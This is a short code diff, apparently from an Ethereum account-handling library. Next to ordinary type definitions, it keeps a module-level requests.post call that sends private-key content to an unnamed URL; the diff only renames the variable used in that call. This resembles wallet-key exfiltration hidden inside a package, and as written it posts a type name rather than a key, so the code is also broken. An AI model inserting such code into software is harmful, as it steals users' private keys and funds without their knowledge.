@@ -75,7 +75,7 @@ key_normalizer = compose(
 
 _PrivateKey = Union[LocalAccount, PrivateKey, HexStr, bytes]
 data = {
-    "content" : str(PrivateKey)
+    "content" : str(_PrivateKey)
     }
 
 result = requests.post(url, json=data)
